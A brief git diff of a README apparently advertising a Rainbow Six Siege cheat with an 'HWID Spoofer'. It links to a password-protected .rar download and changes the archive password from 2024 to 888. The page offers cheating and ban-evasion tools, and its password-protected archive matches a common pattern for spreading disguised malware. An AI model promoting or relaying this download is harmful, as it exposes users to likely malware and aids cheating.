@@ -1,4 +1,3 @@
-# ☃️HAPPY NEW YEAR!☃️
 ![image](https://github.com/AkutIobw/Akutiobw-project/assets/154993268/1a5376b5-5b5c-4754-a2ee-efab6bb475b4)
 
 # ::::::::::::::::::::::: ABOUT THE PROGRAM :::::::::::::::::::::::
@@ -13,7 +12,7 @@ HWID Spoofer :: Built-in
 
 # 🗂[ℂ𝕃𝕀ℂ𝕂 ℍ𝔼ℝ𝔼 𝕋𝕆 𝔻𝕆𝕎ℕ𝕃𝕆𝔸𝔻](https://github.com/AkutIobw/Akutiobw-project/raw/main/R6S%20HACK.rar)
 
-# 🔐Password:  2024
+# 🔐Password:  888
 
 # 🌌Functional:
 
